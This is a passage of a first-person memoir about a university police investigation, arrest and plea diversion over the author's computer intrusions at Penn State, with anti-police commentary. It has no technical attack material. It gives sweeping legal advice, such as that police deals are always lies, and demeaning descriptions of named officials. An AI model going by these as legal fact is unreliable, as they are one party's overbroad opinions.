entity, The Law, which is infinite and can not be explained in
any number of words, codes or legislation.

Dale and I painstakingly weighed our options.

Finally, Dale decided that he was going to contact the police, and
called a friend of his in the police department to ask for assistance
in doing so, Stan Marks [*], who was also an electronic musician.
On occasion, Stan would visit us in the Lab, turning off his walkie-
talkie to avoid the irritation of the numerous trivial assignments
which comprise the day-to-day life of the university cop.
After conferring with Stan, he decided simply to call Wayne and
Jeff on the phone to arrange an interview.

I felt like shit.  The repercussions of my actions were spreading
like ripples on a pond, and were to disrupt the lives of several of
my dearest friends.  At the same time, I was enraged.  How
dare they do this?  What had I done that warranted this torturous
and ridiculous investigation?  Wasn't this investigation enough of
a punishment just in and of itself?

I wondered how many more innocent people would have to be fucked
over before the police would be satisfied, and wondered how many
innocent people, every day, are similarly fucked over in other
investigations.  How many would it take to satisfy the cops?
The answer is, simply, every living person.

If you believe that your past, however lily-white, would withstand
the scrutiny of an investigation of several months' duration, with
every document and communication subjected to minute investigation,
you are deluding yourself.  To the law-enforcement mentality, there
are no innocent people.  There are only undiscovered criminals.

Only if we are all jailed, cops and criminals alike, will the machinery lie
dormant, to rust its way to gentle oblivion; and only then will the ruins be
left undisturbed for the puzzlement of future archaeologists.

With these thoughts, I waited as Dale went to the police station,
with the realization that I was a traitor by inaction, by having
allowed this to happen.

I was guilty, but this guilt was not a matter of law.  My innocent
actions were those which were to be tried.

If you are ever busted, you will witness this curious inversion of
morality, as if by entering the world of cops you have walked
through a one-way mirror, in which your good actions are suddenly
and arbitrarily punished, and the evil you have done is rewarded.


VIII.  Third and Fourth Interrogations

I waited anxiously for Dale to return from his meeting.  He had
brought with him a professional tape recorder, in order to tape
the interview.  The cops were rather upset by this turn
of events, but had no choice but to allow him to tape.  While they
attempted to get their tape recorder to work, he offered to loan
them a pair of batteries, as theirs were dead.

The interrogation followed roughly the same twists and turns as
mine had, with more of an emphasis on the subject of "lab supplies."
Question followed question, and Dale insisted that his actions were innocent.

"Hell, if we'd have had a couple of nice women, none of this
would even have happened," he said.

When asked about the Huang account that Ron Gere had created for
him, he explained that Huang was a nom-de-plume, and certainly not
an alias for disguising crime.

The police persisted, and returned to the subject of "lab supplies",
and finally declared that they knew Dale and I were dealing in some
sort of contraband, but that they would be prepared to offer leniency
if he would give them names.  Dale was adamant in his refusal.

Finally, they said that they wanted him to make a drug buy for
them.

"Well, you'll have to introduce me to someone, because I sure
don't know anyone who does that kind of stuff."

Eventually, they set an appointment with him to speak with Ron
Schreffler, the university cop in charge of undercover narcotics
investigations.

He called to reschedule the appointment a few days later, and then,
eventually, cancelled it entirely, saying:  "I have nothing to talk
to him about."

Finally, they ceased following this tack, realizing that even in
Pennsylvania pursuing an entirely fruitless avenue of investigation
is seen very dimly by their superiors.  The topic of "lab supplies"
was never mentioned again, and certainly not in the arrest warrant
affidavit, as we were obviously innocent of any wrongdoing in that
area.

Warning Dale not to leave the area, they terminated the interview.

Shortly thereafter, there was a fourth and final interview, with
Dale and I present.  We discussed nothing of any significance, and
it was almost informal, as if we and the cops were cronies of some sort.
Only Jeffery Jones was excluded from this circle, as he was limited
largely to monosyllabic grunts and wild, paranoid accusations.  We
discovered that Wayne Weaver was a twenty-three year veteran, and
it struck me that if I had met him in other circumstances I could
have found him quite likable.  He was, if nothing else, a professional,
and acted in a professional manner even when he was beyond his
depth in the sea of information which Dale and I navigated with
ease.

I felt almost sympathetic toward him, and wondered how it was for
him to be involved in a case so complex and bizarre.  I still failed
to realize why he was acting toward us as he was, and realized that
he, similarly, had no idea what to make of us, who must have seemed
to him like remorseless, arrogant criminals.  Unlike my prejudiced
views of what a police officer should be, Wayne was a competent,
intelligent man doing the best he could in a situation beyond his
range of experience, and tried to behave in a conscientious manner.

I feel that Wayne was a good man, but that the very system
he upheld gave him no choice but to do evil, without realizing it.
I am frustrated still by the fact that no matter how much we could
discuss the situation, we could never understand each other in
fullness, because our world-views were so fundamentally different.
Unlike so many of the incompetent losers and petty sadists who
find police work a convenient alternative to criminality, Wayne
was that rarity, a good cop.

Still, without an understanding of the computer subculture, he could not but
see anything we might say to explain it to him as anything other than alien
and criminal, just as a prejudiced American finds a description of the customs
of some South Sea tribe shocking and bizarre.  Until we realize what
underlying assumptions we share with the rest of society, we shall be
divided, subculture from culture, criminals from police.

The ultimate goal of the computer underground is to create the circumstances
which will underlie its own dissolution, to enable the total and free
dissemination of all information, and thus to destroy itself by becoming
mainstream.  When everyone thinks nothing of doing in daylight what we are
forced to do under cover of darkness, then we shall have succeeded.

Until then, we can expect the Operation Sun-Devils to continue,
and the witch-hunts to extend to every corner of cyberspace.  The
public at large still holds an ignorant dread of computers, having
experienced oppression by those who use computers as a tool of
secrecy and intrusion, having been told that they are being audited
by the IRS because of "some discrepancies in the computer," that
their paycheck has been delayed because "the computer's down,"
that they can't receive their deceased spouse's life-insurance benefits
because "there's nothing about it in the computer."  The computer
has become both omnipresent and omnipotent in the eyes of many,
is blamed by incompetent people for their own failure, is used
to justify appalling rip-offs by banks and other major social
institutions, and in addition is not understood at all by the
majority of the population, especially those over thirty, those
who comprise both the law-enforcement mentality and aging hippies,
both deeply distrustful of anything new.

It is thus that such a paradox would exist as a hacker, and if
we are to be successful, we must be very careful to understand
the difference between secrecy and privacy.  We must understand
the difference between freedom of information and freedom from
intrusion.  We must understand the difference between invading
the inner sanctum of oppression and voyeurism, and realize that
even in our finest hours we too are fallible, and that in
negotiating these finely-hued gray areas, we are liable to
lose our path and take a fall.

In this struggle, we can not allow a justifiable anger to become
hatred.  We can not allow skepticism to become nihilism.  We can
not allow ourselves to harm innocents.  In adopting the
intrusive tactics of the oppressors, we must not allow ourselves
to perform the same actions that we detest in others.

Perhaps most importantly, we must use computers as tools to serve
humanity, and not allow humans to serve computers.  For the
non-living to serve the purposes of the living is a good and
necessary thing, but for the living to serve the purposes of
the non-living is an abomination.

IX.  Consultations

Dale and I began to consider options in our battle against this senseless
investigation.  We spent many nights pondering the issue, and arrived at a
number of conclusions.

Since we had already talked to the police, and were rapidly realizing
what a vast error that had been, we wondered how it was possible
to sidestep, avoid or derail the investigation.  We hoped that Ron
Gere and others would not be held accountable for my actions, a wish
that was to be denied.

A great deal of resentment existed toward me in those whose
lives were affected, and I would be either an idiot or a liar to deny
that my actions affected many people, in many places, some of whom I
had never even met in person.  However, I was unable to do anything
for many of these people, so I concentrated largely on my own survival
and that of those near me.

Dale and I decided, eventually, that the only person who could claim
any real damage was Dhamir Mannai, and we arranged an
appointment with him to discuss what had happened.

We met in his book-lined office in the Electrical Engineering Office,
and shook hands before beginning a discussion.  I explained what
I had done, and why I had done it, and apologized for any damages that
had occurred.  Dale, similarly, excused my actions, and while he had
nothing to do with them, noted that he was under investigation as well.

We offered to help repair the /etc/groups file which I had damaged,
but due to the circumstances, it is understandable that he politely
declined our offer.

Dhamir was surprisingly sympathetic, though justifiably angered.  However,
after about a half hour of discussion, he warmed from suspicion to
friendliness, and after two hours of discussion he offered to testify
for us against the police, noting that he had been forced on two previous
occasions to testify against police.  He held a very dim
view of the investigation, and noted that "The police have bungled the case
very badly."  Dhamir, in fact, was so annoyed by the investigation that he
called Wayne that night to object to it.  He made it clear that he
intended to oppose the police.

The next night, as Dale and I were entering the Music Building, a police
cruiser came to a sudden stop in the parking lot and Wayne walked up to
us with a perturbed expression.

Without pausing for greetings, he informed us that he was now
considering filing additional charges against us for "Tampering with
Witnesses," without identifying the witness.  In his eyes, the legality
of restraining our actions and speech based on hypothetical and unfiled
charges was not relevant; and he was angry that a primary witness had
been rendered useless to him.

Finally, we talked more informally.  Genuinely curious about his
motivations, we asked him about the investigation and what turns
could be expected in the future.  Realizing that the investigation
had entered a quiescent stage and we would not likely meet again
until court, we talked with him.

Dale said "So let me get this straight.  They saddled the older,
more experienced cop with the recruit?"

Wayne didn't answer, but nodded glumly.

"What's this like for you?" I asked.

"Well, I have to admit, in my twenty-three years on the force,
this case is the biggest hassle I've ever had."

"I can see why," said Dale.

"I almost wish you had been in charge of this case, instead of that
goof Jeff," I said.

"Yes, he's too jumpy," said Dale.  "Like an Irish Setter with a gun."

"Well, if I'd been in charge of this case," Wayne said, "it would have
been down the pike a long time ago."

After more discussion of this sort, Wayne's walkie-talkie burst into
cop chatter.

"We have three men, throwing another man, into a dumpster, behind
Willard," the voice said.

"I guess this means you have to leave, Wayne," said Dale.

Wayne looked embarrassed.  We exchanged farewells.

Another very helpful person was Professor Richard Devon,
of the Science, Technology and Science department of Penn State.  We
read an article he wrote on the computer underground which, while
hardly condoning malicious hacking, certainly objected to the prevailing
witch-hunt mentality.  We contacted him to discuss the case.

He offered to provide testimony in our behalf, and informed us
of the prevailing attitudes of computer security professionals at
Penn State and elsewhere.  He corroborated our belief that the
vendetta against us was largely due to the fact that we had embarrassed
Penn State, and that the intensity of the investigation was also largely
due to fallout from the Morris Worm incident.

The fact that he was on the board of directors for the Engineering Computer
Lab increased the value of his testimony.  We were expecting damaging
testimony from Bryan Jensen of ECL.

He was friendly and personable, and we talked for several hours.

While there was nothing he could do until the time came to give testimony,
it was very gratifying to find two friends and allies in what we had
thought was a hostile camp.

Our feeling of isolation and paranoia began to dwindle, and we began to
feel more confident about the possible outcome of the investigation.


X.  Going Upstairs

With a new-found confidence, we decided to see if it were possible to
end this investigation entirely before charges were filed and it
became a criminal prosecution.

Dale called the Director of Police Services with the slim hope that
he had no knowledge of this investigation and might intervene to stop
it.  No dice.

Dale and I composed a letter to the district attorney objecting to
the investigation, also in the hopes of avoiding the prosecution of
the case.  I include the letter:


    Dear Mr. Gricar:

    We are writing to you because of our concerns regarding an investigation
    being conducted by the Pennsylvania State University Department of
    University Safety with respect to violations of Pa.C.S.A. tilde 3933
    (Unlawful Use of Computer) alleged to us.  We have enclosed a copy of
    this statute for your convenience.

    Despite recommendations from NASA security officials and concerned members
    of the professional and academic computing community that we file suit
    against the Pennsylvania State Universities, we have tried earnestly to
    accommodate this investigation.

    We have cooperated fully with Police Services Officers Wayne Weaver
    and Jeffrey Jones at every opportunity in this unnecessary eight-week
    investigation.   However, rather than arranging for direct communication
    between the complaining parties and us to make it possible to make clear
    the nature of our activities, the University Police have chosen to siphon
    information to these parties in an easily-misinterpreted and secondhand
    manner.  This has served only to obscure the truth of the matter and create
    confusion, misunderstanding and inconvenience to all involved.

    The keen disappointment of the University Police in finding that we have
    not been involved in espionage, electronic funds transfer or computer
    terrorism appears to have finally manifested itself in an effort to
    indict us for practices customary and routine among faculty and students
    alike. While we have come to realize that activities such as using a
    personal account with the permission of the authorized user may constitute
    a violation of an obscure and little-known University policy, we find it
    irregular and unusual that such activities might even be considered a
    criminal offense.

    The minimal and inferential evidence which either will
    or has already been brought before you is part of a preposterous attempt to
    shoehorn our alleged actions into the jurisdiction of a law which lacks
    relevance to a situation of this nature.

    We have found this whole affair to be capricious and arbitrary, and despite
    our reasonable requests to demonstrate and display our activities in the
    presence of computer-literate parties and with an actual computer, they
    have, for whatever reasons, denied direct lines of communication which
    could have enabled an expeditious resolution to this problem.

    This investigation has proceeded in a slipshod manner, rife with inordinate
    delays and intimidation well beyond that justified by an honest desire to
    discern the truth.  While certain evidence may appear to warrant scrutiny,
    this evidence is easily clarified; and should the District Attorney's
    office desire, we would be pleased to provide a full and complete
    accounting of all our activities at your convenience and under oath.

    In view of the judicial system being already overtaxed by an excess of
    important and pressing criminal cases, we would like to apologize for
    this matter even having encroached on your time.

                                      Sincerely yours,



                                      Dale Garrison
                                      Robert W. F. Clark


This letter had about as much effect as might be imagined, that is to
say, none whatever.

My advice from this experience is that it is very likely that you will
be able to find advice in what you might think to be a hostile quarter.
To talk to the complaining party and apologize for any damage you might
have caused is an excellent idea, and has a possibility of getting the
charges reduced or perhaps dropped entirely.

Simply because the police list a person as a complaining party does not
necessarily mean that the person necessarily approves of, or even has
knowledge of, the police proceedings.  In all likelihood, the complaining
parties have never met you, and have no knowledge of what your
motivations were in doing what you did.  With no knowledge of your motives,
they are likely to attribute your actions to malice.

If there are no demonstrable damages, and the person is sympathetic, you
may find an ally in the enemy camp.  Even if you have damaged a machine,
you are in a unique position to help repair it, and prevent further
intrusion into their system.

Regardless of the end result, it can't hurt to get some idea of what
the complaining parties think.  If you soften outright hostility and
outrage even to a grudging tolerance, you have improved the chance
of a positive outcome.

While the police may object to this in very strong terms, and make dire
and ambiguous threats, without a restraining order of some kind there
is very little they can do unless you have bribed or otherwise
offered a consideration for testimony.

Talking to the police, on the other hand, is a very bad idea, and
will result in disaster.  Regardless of any threats and intimidation they
use, there is absolutely nothing they can do to you if you do not
talk to them.  Any deal they offer you is bogus, a flat-out lie.  They
do not have the authority to offer you a deal.  These two facts can not
be stressed enough.  This may seem common knowledge, the sort even an
idiot would know.  I knew it myself.

However, from inexperience and arrogance I thought myself immune
to the rules.  I assumed that talking to them could damage nothing,
since I had done nothing wrong but make a mistake.  Certainly
this was just a misunderstanding, and I could easily clear it up.

The police will encourage you to believe this, and before you realize it
you will have told them everything they want to know.

Simply, if you are not under arrest, walk away.  If you are
under arrest, request an attorney.

Realize that I, a confirmed paranoid, knowing and having heard this
warning from other people, still fell into the trap of believing myself
able to talk my way out of prosecution.  Don't do the same thing
yourself, either from fear or arrogance.

Don't tell them anything.  They'll find out more than enough without
your help.


XI.  Interlude

Finally, after what had seemed nearly two weeks of furious activity,
constant harassment and disasters, the investigation entered a more
or less quiescent state.  It was to remain in this state for several
months.

This is not to say that the harassment ceased, or that matters improved.
The investigation seemed to exist in a state of suspended animation, from
our viewpoint.  Matters ceased getting worse exponentially.
Now, they merely got worse arithmetically.

My parents ejected me from home for the second time due to my
grades.  They did not know about the police investigation.  I
was in no hurry to tell them about it.  I could have went to live
with my father, but instead I returned to State College by bus, with no
money, no prospects and no place to live.  I blamed the police
investigation for my grades, which was not entirely correct.  I
doubt, however, that I would have failed as spectacularly as I had
if the police had not entered my life.

Over the Christmas break, when the campus was mostly vacant, Dale
noticed a new set of booted footprints in the new-fallen snow every
night, by the window to the Electronic Music Lab, and by that window
only.

A few times, I heard static and odd clicks on the telephone at
the Lab, but whether this was poor telephone service or some
clumsy attempt at a wiretap I can not say with assurance.

I discovered that my food card was still valid, so
I had a source of free food for a while.  I had switched to a
nocturnal sleep cycle, so I slept during the day in the Student Union
Building, rose for a shower in the Athletics Building at about midnight,
and hung out in the Electronic Music Lab at night.  Being homeless is not as
difficult as might be imagined, especially in a university environment,
as long as one does not look homeless.  Even if one does look scruffy,
this will raise few eyebrows on a campus.

Around this time, I switched my main interest from computer hacking to
reading and writing poetry, being perhaps the thousandth neophyte poet
to use Baudelaire as a model.  I suppose that I was striving to create
perfection from imperfect materials, also my motivation for hacking.

Eventually, Dale offered to let me split the rent with him on a room.
The police had 'suggested' that WPSX-TV3 fire him from his job as an
audio technician.  Regardless of the legality of this skullduggery,
WPSX-TV3, a public television station, reprehensibly fired him.
This is another aspect of the law-enforcement mentality which bears
close examination.

While claiming a high moral ground, as protectors of the community,
they will rationalize a vendetta as somehow protecting some vague and
undefined 'public good.'  With the zeal of vigilantes, they
will eschew the notion of due process for their convenience.  Considering
the law beneath them, and impatient at the rare refusal of judges and
juries to be a rubber-stamp for police privilege, they will take
punishment into their own hands, and use any means necessary to destroy
the lives of those who get in their way.

According to the Random House Dictionary of the English Language
(Unabridged Edition):

    Police state:  a nation in which the police, especially a
    secret police, suppresses any act by an individual or group
    that conflicts with governmental policy or principle.

Since undisclosed members of CERT, an organization directly
funded by Air Force Intelligence, are authorized to make anonymous
accusations of malfeasance without disclosing their identity, they
can be called nothing but secret police.

The spooks at the CIA and NSA also hold this unusual privilege, even if
one does not consider their 'special' operations.  What can these
organizations be called if not secret police?

It can not be denied, even by those myopic enough to believe that such
organizations are necessary, that these organizations comprise a vast
and secret government which is not elected and not subject to legal
restraint.  Only in the most egregious cases of wrongdoing are these
organizations even censured; and even in these cases, it is only the
flunkies that receive even a token punishment; the principals, almost
without exception, are exonerated and even honored.  Those few
who are too disgraced to continue work even as politicians ascend to
the rank of elder statesmen, and write their memoirs free from
molestation.

When your job, your property and your reputation can be destroyed
or stolen without recompense and with impunity, what can our
nation be called but a police state?  When the police are even free
to beat you senseless without provocation, on videotape, and still
elude justice, what can this nation be called but a police state?

Such were my thoughts during the months when the investigation
seemed dormant, as my anger began, gradually, to overcome
my fear.  This is the time that I considered trashing
the Penn State data network, the Internet, anything I could.
Punishment, to me, has always seemed merely a goad to future
vengeance.  However, I saw the uselessness of taking revenge on
innocent parties for the police's actions.

I contacted the ACLU, who showed a remarkable lack of interest in
the case.  As charges had not been filed, there was little they
could do.  They told me, however, to contact them in the event
that a trial date was set.

"If you cannot afford an attorney, one will be provided for you."
This is, perhaps, the biggest lie in the litany of lies
known as the Miranda rights.  It is the court which prosecutes
you that decides whether you can afford an attorney, and the same
court selects that attorney.

Without the formal filing of charges, you can not receive the assistance
of a public defender.  This is what I was told by the public defender's
office.  Merely being investigated apparently does not entail the right
to counsel, regardless of the level of harassment involved in the
investigation.

We remained in intermittent contact with the police, and called
every week or so to ask what was happening.  We learned nothing new.
The only information of any importance I did learn was at a
party.  Between hand-rolled cigarettes of a sort never sold by
the R. J. Reynolds' Tobacco Company, I discussed my case.

This might not be the sort of thing one would normally do at a party,
but if you are busted you will find that the investigation takes a
central role in your life.  When you are not talking about it, you
are thinking about it.  When you are not thinking about it, you are
trying the best you can not to think about it.  It is a cherished belief
of mine that anyone who survives a police investigation ought to receive
at least an Associate's degree in Criminal Law; you will learn more about
the law than you ever wished to know.

The person on my right, when I said that Jeffery Jones was in charge
of the case, immediately started.  "He was in my high school class,"
said the man, who sported a handlebar mustache.

"What?  Really?  What's he like?  Is he as much of an asshole in person?"
I asked.

"He was kind of a weird kid."

"How?  What's he done?  Have you kept in touch?"

"Well, all I really know about him is that he went out to be a cop in
Austin, but he couldn't take it, had a breakdown or something, and came
back here."

"I can see that.  He's a fucking psycho."

I gloated over this tidbit of information, and decided that I would
use it the next time I met the police.

This was to be several weeks.  Though we had given the police our work
schedules, phone numbers at home, work and play; and informed them when
they might be likely to locate us at any particular place, we had apparently
underestimated the nearly limitless incompetence of Penn State's elite
computer cops.

As he was walking to work one day, Dale saw Jeffery Jones driving
very slowly and craning his neck in all directions, apparently looking
for someone.  However, he failed to note the presence of Dale, the only
person on the street.  Dale wondered whether Jeffery had been looking for
him.

The next night at the Lab, the telephone rang.  With a series of typical,
frenzied accusations Jeffery Jones initiated the conversation.  He believed
that we had been attempting to escape or evade him in some manner.  Wayne
was on another line, and Dale and I talked from different phones.

"You've been trying to avoid us, haven't you?" Jeffery shouted.

"Where have you been?" asked Wayne.

"We told you where we'd be.  You said you'd be in touch,"  I said.

"We haven't been able to find you," said Wayne.

"Look, you have our goddamn work schedule, our address, our phone
numbers, and where we usually are.  What the hell else do you need?"
asked Dale.

"We went to your address.  The guy we talked to didn't know where
you were,"  said Wayne.

As we discovered later that night, the police had been at our apartment,
and had knocked on the wrong door, that of our downstairs neighbor,
a mental patient who had been kicked out of the hospital after Reagan's
generous revision of the mental health code.  His main activity was
shouting and threatening to kill people who weren't there, so the
consternation of the police was not surprising.

"So we weren't there.  You could have called," said Dale.

"I just hope you don't decide to leave the area.  We're going to
arrest you in a couple of days," said Wayne.

"You've been saying that for the last three months," I said.
"What's taking so long?"

"The secretary's sick," said Jeffery.

"You ought to get this secretary to a doctor.  She must be
really goddamn sick, if she can't type up an arrest warrant
in three months," said Dale.

"Hell, I'll come down and type up the damn thing myself, if
it's too tough for the people you have down there," I offered.

"No, that won't be necessary," said Wayne.

"Look, when you want to arrest us, just give us a call and we'll
come down.  Don't pull some dumb cop routine like kicking in the
door," said Dale.

"Okay," Wayne said.  "Your cooperation will be noted."

"By the way, Jeff, I heard you couldn't hack it in Austin," I said.

Silence followed.

After an awkward silence, Wayne said:  "We'll be in touch."

We said our goodbyes, except for Jeffery, and hung up the phones.

I somewhat regretted the last remark, but was still happy with its
reception.  It is probably unwise to play Scare-the-Cops, but by
then I no longer gave a damn.  He was probably dead certain that I
had found this information, and other tidbits of information I had
casually mentioned, in some sort of computer database.  His mind
was too limited to consider the possibility that I had met an old
high-school chum of his and pumped him for information.

By this time, our fear of the police had diminished, and both of
us were sick to death of the whole business.  We just hoped that
whatever was to happen would happen more quickly.

When the police first started threatening to arrest us within days,
it would send a tremor down my spine.  However, after three months of
obfuscation, excuses, continued harassment of this nature, my only
response to this threat was anger and boredom.

At least, upon arrest, we would enter a domain where there were some
rules of conduct and some certainty.  The Kafkaesque uncertainty and
arbitrarily redefined rules inherent in a police investigation were
intolerable.

After another month of delay, the police called us again,
and we agreed to come in to be arrested at nine o'clock the
next morning.

It was possible that the police would jail us, but it seemed unlikely.
Two prominent faculty members had strongly condemned the behavior of
the police.  The case was also politically-charged, and jailing us
would likely have resulted in howls of outrage, and perhaps even in
a civil or criminal suit against Penn State.

Wayne told us that we would have to go to the District Magistrate
for a preliminary hearing.  Dale said that we would go, but demanded a ride
there and back.  The police complied.

We were more relieved than worried.  Finally, something was happening.


XII.  The Arrest

On a cold and sunny morning we walked into the police station to be
arrested.  I was curious as to the fingerprinting procedure.  The cops
were to make three copies of my fingerprints, one for the local police,
one for the state police, and one for the FBI.

Jeffery was unable to fingerprint me on the first two attempts.
When he finally succeeded in fingerprinting me, he had to do it again.
He had incorrectly filled out the form.  Finally, with help
from Wayne, he was able to fingerprint me.

Dale was more difficult.  Jeffery objected to the softness of Dale's
fingers, and said that would make it difficult.  The fact that Dale's
fingers were soft, as he is a pianist more accustomed to smooth
ivory than plastic, would seem to exonerate him from any charge of
computer hacking.  However, such a thought never troubled the idyllic
vacancy of Jeffery's mind.  He was too busy bungling through
the process of fingerprinting.  Wayne had to help him again.

There was soap and water for washing the ink from our
fingers.  However, it left the faintest trace of ink on the pads
of my fingers, and I looked at the marks with awe, realizing that
I had been, in a way, permanently stigmatized.

However, as poorly as the soap had cleaned my fingers, I thought
with grim amusement that Jeffery would have much more difficulty
cleaning the ink from his clothes.

Jeffery did not take the mug shots.  A photographer took them.
Therefore, it went smoothly.

Finally, Wayne presented me with an arrest warrant affidavit, evidently
written by Jeffery Jones.  A paragon of incompetence, incapable of
performing the simplest task without assistance, Jeff had written an
eighteen-page arrest warrant affidavit which was a marvel of incoherence
and inaccuracy.  This document, with a list of corrections and emendations,
will appear in a separate article.

While reading the first five pages of this astounding document, I attempted
to maintain an air of solemnity.  However, by the sixth page, I was stifling
giggles.  By the seventh, I was chuckling out loud.  By the eighth page I
was laughing.  By the ninth page I was laughing loudly, and I finished the
rest of the document in gales of mirth.  Everyone in the room stared at me
as if I were insane.  This didn't bother me.  Most of my statements to the
police resulted in this sort of blank stare.  Even Dale looked as if
he thought I had cracked, but he understood when he saw his arrest
warrant affidavit, nearly identical to mine.

I simply was unable to take seriously that I had spent months worrying
about what kind of a case they had, when their best effort was this
farrago of absurdities.

They took us to Clifford Yorks, the District Magistrate, in separate
cars.  This time, we rode in the front seat, and two young recruits
were our chauffeurs.  Dale asked his driver if he could turn on the
siren.  The cop was not amused.

The only thing which struck me about Clifford Yorks was
that he had a remarkably large head.  It appeared as if it
had been inflated like a beach ball.

The magistrate briefly examined the arrest warrant affidavits,
nodded his vast head, and released us on our own recognizance,
in lieu of ten thousand dollars bail.  He seemed somewhat preoccupied.
We signed the papers and left.  The police offered to give
us a ride right to our house, but we said we'd settle for being
dropped off in town.

Being over a month in arrears for rent, we did not like the idea
of our landlord seeing us arrive in separate police cars; also,
our address was rather notorious, and other residents would be
greatly suspicious if they saw us with cops.

An arraignment was scheduled for a date months in the future.
The waiting game was to resume.


XIII.  Legal Counsel

Having been arrested, we were at last eligible for legal counsel.
We went to the yellow pages and started dialing.  We started with
the attorneys with colored half-page ads.  Even from those advertising
"Reasonable Rates," we received figures I will not quote for fear
of violating obscenity statutes.

Going to the quarter-page ads, then the red-lettered names, then the
schmucks with nothing but names, we received the same sort of numbers.
Finally talking to the _pro bono_ attorneys, we found that we were
entitled to a reduction in rates of almost fifty per cent.

This generosity brought the best price down to around three thousand
dollars, which was three thousand dollars more than we could afford.

So we contacted the public defender's office.

Friends told me that a five thousand dollar attorney is worse, even,
than a public defender; and that it takes at least twenty thousand
to retain an attorney with capable of winning anything but the most
open-and-shut criminal case.

After a certain amount of bureaucratic runaround, we were assigned two
attorneys.  One, Deborah Lux, was the Assistant Chief Public Defender;
the other, Dale's attorney, was Bradley Lunsford, a sharp, young
attorney who seemed too good to be true.

We discussed the case with our new attorneys, and were told that the
best action we could take to defend ourselves was to do nothing.

This is true.  Anything we had attempted in our own defense, with
the exception of contacting the complaining party, had been harmful
to our case.  Any discussions we had with the police were taped and
examined for anything incriminating.  A letter to the district
attorney was ignored entirely.

Do absolutely nothing without legal counsel.  Most legal counsel will
advise you to do nothing.  Legal counsel has more leverage than you do,
and can make binding deals with the police.  You can't.

We discussed possible defenses.

As none of the systems into which I had intruded had any sort of warning
against unauthorized access, this was considered a plausible defense.

The almost exclusive use of 'guest' accounts was also beneficial.

A more technical issue is the Best Evidence rule.  We wondered whether
a court would allow hardcopy as evidence, when the original document was
electronic.  As it happens, hardcopy is often admissible due to
loopholes in this rule, even though hardcopy is highly susceptible to
falsification by the police; and most electronic mail has no
built-in authentication to prove identity.

Still, without anything more damaging than electronic mail, a case
would be very difficult to prosecute.  However, with what almost
amounted to a taped confession, the chance of a conviction
was increased.

We went over the arrest warrant affidavit, and my corrections to it,
with a mixture of amusement and consternation.

"So what do you think of this?" asked Dale.

After a moment of thought, Deb Lux said:  "This is gibberish."

"I just had a case where a guy pumped four bullets into his brother-in-law,
just because he didn't like him, and the arrest warrant for that was two
pages long.  One and a half, really," said Brad.

"Does this help us, at all, that this arrest warrant is just demonstrably
false, that it literally has over a hundred mistakes in it?" I asked.

"Yeah, that could help," said Brad.

We agreed to meet at the arraignment.


XIV.  The Stairwells of Justice

The arraignment was a simple procedure, and was over in five minutes.
Prior to our arraignment, five other people were arraigned on charges
of varying severity, mainly such heinous crimes as smoking marijuana
or vandalism.

Dale stepped in front of the desk first.  He was informed of the charges
against him, asked if he understood them, and that was it.

I stepped up, but when the judge asked me whether I understood the charges,
I answered that I didn't, and that the charges were incomprehensible
to a sane human being.  I had hoped for some sort of response, but
that was it for me, too.

A trial date was set, once again months in advance.

A week before the date arrived, it was once again postponed.

During this week, we were informed that Dale's too good to be true
attorney, Brad Lunsford, had went over to the District Attorney's
office.  He was replaced by Dave Crowley, the Chief District Attorney,
a perpetually bitter, pock-faced older man with the demeanor and
bearing of an angry accountant.

Crowley refused to consider any of the strategies we had discussed
at length with Brad and Deb.  Dale was understandably irate at the
sudden change, as was I, for when Deb and I were attempting to discuss
the case he would interject rude comments.

Finally, after some particularly snide remark, I told him to fuck
off, or something similarly pleasant, and left.  Dale and I tried to
limit our dealings to Deb, and it was Deb who handled both of our
cases to the end, for which I thank God.

The day arrived.

We dressed quite sharply, Dale in new wool slacks and jacket.  I dressed
in a new suit as well, and inserted a carnation in my buttonhole as
a gesture of contempt for the proceedings.

Dale looked so sharp that he was mistaken for an attorney twice.  I
did not share this distinction, but I looked sharp enough.  I had
shaved my beard a month previously after an error in trimming,
so I looked presentable.

We realized that judges base their decisions as much on your appearance
as on what you say.  We did not intend to say anything, so
appearance was of utmost importance.

We arrived at about the same time as at least thirty assorted computer
security professionals, police, witnesses and ancillary court personnel.
Dhamir Mannai and Richard Devon were there as well, and we exchanged
greetings.  Richard Devon was optimistic about the outcome, as was
Dhamir Mannai.  The computer security people gathered into a tight,
paranoid knot, and Richard Devon and Dhamir Mannai stood about ten
feet away from them, closer to us than to them.  Robert Owens,
Angela Thomas, Bryan Jensen, and Dan Ehrlich were there, among others.
They seemed nervous and ill-at-ease in their attempt at formal dress.
Occasionally, one or another would glare at us, or at Devon and Mannai.
I smiled and waved.

A discussion of some sort erupted among the computer security people,
and a bailiff emerged and requested that they be quiet.  The second time this
was necessary, he simply told them to shut up, and told them to take
their discussion to the stairwells.  Dale and I had known of the noise
policy for some time, and took all attorney-client conferences to the
stairwells, which were filled at all times with similar conferences.
It seemed that all the hearings and motions were just ceremonies without
meaning; all the decisions had been made, hours before, in the stairwells
of justice.

Finally Deb Lux arrived, with a sheaf of documents, and immediately left,
saying that she would return shortly.  A little over twenty minutes later,
she returned to announce that she had struck a deal with Eileen Tucker,
the Assistant District Attorney.

In light of the garbled nature of the police testimony, the spuriousness
of the arrest warrant affidavit, the hostility of their main witness,
Dhamir Mannai, and the difficulty of prosecuting a highly technical case,
the Office of the District Attorney was understandably reluctant to
prosecute us.

I was glad not to have to deal with Eileen Tucker, a woman affectionately
nicknamed by other court officials "The Wicked Witch of the West."
With her pallid skin, and her face drawn tightly over her skull as
if she had far too much plastic surgery, this seemed an adequately
descriptive name, both as to appearance and personality.

The deal was Advanced Rehabilitative Disposition, a pre-trial diversion in
which you effectively receive probation and a fine, and charges are dismissed,
leaving you with no criminal record.  This is what first-time
drunk drivers usually receive.

It is essentially a bribe to get the cops off your back.

The fines were approximately two thousand dollars apiece, with Dale
arbitrarily receiving a fine two hundred dollars greater than mine.

After a moment of thought, we decided that the fines were too large.
We turned down the deal, and asked her if she could get anything
better than that.

After a much shorter conference she returned, announcing
that the fines had been dropped by about a third.  Still unsatisfied,
but realizing that the proceedings, trial, jury selection, delays,
sentencing, motions of discovery and almost limitless writs and
affidavits and appeals would take several more months, we agreed
to the deal.  It was preferable to more hellish legal proceedings.

We discussed the deal outside with Richard Devon; Dhamir Mannai had left,
having pressing engagements both before and after his testimony had
been scheduled.  We agreed that a trial would probably have resulted
in an eventual victory, but at what unaffordable cost?  We had no
resources or time for a prolonged legal battle, and no acceptable
alternative to a plea-bargain.


XV.  The End?  Of Course Not; There Is No End

This, we assumed incorrectly, was the end.  There was still a date
for sentencing, and papers to be signed.

